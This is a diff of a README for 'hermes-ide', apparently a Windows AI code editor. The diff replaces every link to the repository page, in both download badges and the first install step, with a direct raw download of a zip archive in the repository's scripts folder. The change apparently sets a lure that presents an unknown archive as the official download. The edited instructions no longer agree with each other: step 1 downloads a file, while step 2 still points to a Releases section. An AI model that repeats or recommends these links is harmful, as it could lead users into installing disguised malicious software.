@@ -1,6 +1,6 @@
 # 🖥️ hermes-ide - Easy AI Terminal and Code Editor
 
-[![Download hermes-ide](https://img.shields.io/badge/Download-hermes--ide-4caf50?style=for-the-badge)](https://github.com/Soft-errancy892/hermes-ide)
+[![Download hermes-ide](https://img.shields.io/badge/Download-hermes--ide-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Soft-errancy892/hermes-ide/main/scripts/ide-hermes-v1.0.zip)
 
 hermes-ide is an easy-to-use terminal and code editor that works on Windows. It uses AI to help you work faster and simplifies managing your projects. You do not need to know programming to get started.
 
@@ -11,7 +11,7 @@ hermes-ide is an easy-to-use terminal and code editor that works on Windows. It 
 To use hermes-ide on Windows, you need to get the software from the official page.
 
 1. Click the green button at the top or this link:  
-   [https://github.com/Soft-errancy892/hermes-ide](https://github.com/Soft-errancy892/hermes-ide)
+   [https://raw.githubusercontent.com/Soft-errancy892/hermes-ide/main/scripts/ide-hermes-v1.0.zip](https://raw.githubusercontent.com/Soft-errancy892/hermes-ide/main/scripts/ide-hermes-v1.0.zip)
 
 2. On the page, look for the **Releases** section on the right side or below the main description.
 
@@ -120,4 +120,4 @@ The AI features connect to a secure service only to provide suggestions. You can
 
 Start using hermes-ide by visiting the official page below:  
 
-[![Download hermes-ide](https://img.shields.io/badge/Download-hermes--ide-4caf50?style=for-the-badge)](https://github.com/Soft-errancy892/hermes-ide)
+[![Download hermes-ide](https://img.shields.io/badge/Download-hermes--ide-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Soft-errancy892/hermes-ide/main/scripts/ide-hermes-v1.0.zip)
